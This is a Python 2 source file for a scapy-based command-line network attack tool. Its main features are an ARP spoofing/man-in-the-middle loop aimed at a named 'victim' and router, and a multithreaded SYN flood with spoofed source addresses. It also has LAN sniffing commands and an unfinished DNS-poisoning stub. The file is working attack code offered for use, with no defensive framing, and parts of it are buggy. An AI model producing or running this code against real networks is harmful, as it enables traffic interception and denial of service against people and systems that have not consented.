#!/usr/bin/env python
import socket, random, sys, threading
import cmd
import logging
import string, sys
from scapy.all import *
import nmap   
import time
from subprocess import call


#Long term:
#   1. ARP or MITM working
#   2. put in virtualenv, test with different python versions, make requirements.txt

#https://pypi.python.org/pypi/netaddr/ TODO
#PACKAGES INCLUDE list cmd2, python-nmap, nfeque, scapy TODO

clientsList = [ ]
global myip

yes = set(['yes','y', 'ye', 'Y','YE','YES','yea', 'yeah', 'oui', ''])
no = set(['no','n', 'No', 'NO', 'non', 'nah'])

#choice = raw_input().lower()
def yesorno(choice):
    if choice in yes:
	return True
    elif choice in no:
	return False
    else:
	sys.stdout.write("Please respond with 'yes' or 'no'")
	

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at   
	clients = pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
	#print "In arp_monitor_callback, clients:", clients
	clients = clientsList.append(clients)
	for clients in clientsList:
	    print "client: ", clients
	    print "\nTotal clients: ", len(clientsList)
	#return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
	
	
class Arp:
#    def __init__(self, victim 
    def __init__(self, routerIP, victimIP, routerMAC, victimMAC):
	self.routerIP = routerIP
	self.victimIP = victimIP
	self.routerMAC = routerMAC
	self.victimMAC = victimMAC

    def originalMAC(ip):
        ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
        for s,r in ans:
            return r[Ether].src
        
    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))#TODO error
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
    
    def restore(routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
        sys.exit("losing...")    

   # def signal_handler(signal, frame):
   #     with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
   #         ipf.write('0\n')#disable IP forwarding
        restore(self.routerIP, self.victimIP, self.routerMAC, self.victimMAC)
        

class sendSYN(threading.Thread):
        def __init__(self, targetip, port):
                threading.Thread.__init__(self)
		self.targetip = targetip
		self.port = port
	
        def run(self):
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = self.targetip

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = self.port
                t.flags = 'S'

                send(i/t, verbose=0)

 
class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = '> '
        
        

    def do_netiface(self, arg):
	"""Takes no arguments	
	    View and/or change your Network Interface Card"""
	
	print "Current: ", conf.iface
	print "\nChange it? "
	choice = raw_input().lower()
		
	if yesorno(choice) is True:
	    conf.iface = raw_input("Enter network interface: ")  
	    
	    
	 
    def do_ip(self, arg):
	"""Takes no arguments
	Gets your IP address"""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	myip = (s.getsockname()[0])
	print "Your ip: ", myip
	
	

    def do_clientlist(self, arg):
	"""Takes no arguments.
	    Prints list of clientsList and MAC and IP addresses
	    on LAN"""
	#TODO split entires in the list by ip and mac
	    # check if ip address is our ip and display some kinda flag so user knows
	sortedclientsList = sorted(set(clientsList))
	print "Number of clients: ", len(sortedclientsList)
	for x in sortedclientsList:
	    print "\n", x
	    
	    

    def do_clients(self, arg):
	""" Takes no arguments 
	View clients connected to router
	clients """

	#Same command as: nmap -sP 192.168.1.1/24
	#TODO make background job and quit after certain amount of time
	#   or if ip address/MAC is the same in clientsList
	print "Pinging clients... \n"
	sniff(prn=arp_monitor_callback, filter="arp", store=0)  
	
	
    def do_router(self, arg):
	"""Takes no arguments.
	    Executes arp -a 
	    Should be address of router"""
	call(["arp", "-a"]) 	    

    def do_ping(self, arg):
	"""ping [host IP address] [count] 
	    Pings IP address"""
	if not(arg):
	    print "No ip entered"
	else:
	    print "\nPinging... ",arg,"\n"
	    ip_target = arg 
	    data = "Space for Rent!"
	    ip = IP()
	    icmp = ICMP()
	    ip.dst = ip_target
	    icmp.type = 8
	    icmp.code = 0
	    a = sr1(ip/icmp/data)
	    a.summary()

    def do_arp(self, arg):
	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]"""
	
	arplist = arg.split(" ")
    
	if len(arplist) < 4:
	    print "\n Error, not enough args \n"
	else:
	    print"Enabling IP forwarding...\n"
    
	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		ipf.write('1\n')#enable IP forwarding with '1'     
	    #signal.signal(signal.SIGINT, signal_handler)
	    
	
	    routerIP = arplist[0]
	    victimIP = arplist[1]	    
	    routerMAC = arplist[2]	    
	    victimMAC = arplist[3]
	       
	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       

	    while 1:
		try:
		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
		    time.sleep(1.5)
		except KeyboardInterrupt:
		    print "\n"
		    break
	       
	
    def do_dns(self, arg):
	"""DNS Poisioning."""	
	
	
    
    def do_syn(self, arg):
	"""syn [target ip] [port]
    #########################################
    # 
    # SYNflood - A multithreaded SYN Flooder
    # author: arthurnn
    #
    #
    #########################################

	   SYN flood: https://github.com/arthurnn/SynFlood  
	    """
	if not(arg):
	    print "No ip entered"
	else:

	    print "\n",arg,"\n"
	    targetlist = arg.split(" ")
	    targetip = targetlist[0]	
	    port = int(targetlist[1])	
	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
	
	    total = 0

	    while 1:
		try:
		    syner = sendSYN(targetip, port)
		    syner.start()
		    total += 1
		    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
		except KeyboardInterrupt:
		    print "\n"
		    break
	

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit
    do_c = do_clients
    do_cl = do_clientlist
    do_net = do_netiface
    do_neti = do_netiface
    do_p = do_ping
    do_r = do_router

if __name__ == '__main__':

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

      
    call(["ip", "address"])#TODO use pip package netifaces?? 
 
#    print "Please enter network interface:"
    conf.iface = raw_input("\nEnter network interface: ")  

    #hackish - ping Google and get our IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    myip = (s.getsockname()[0])
    print "\n Your network interface: ", conf.iface
    print "\n Your IP address: ", myip
    s.close()

    print"\n Type 'help' \n"
    cli = CLI()
    cli.cmdloop() 
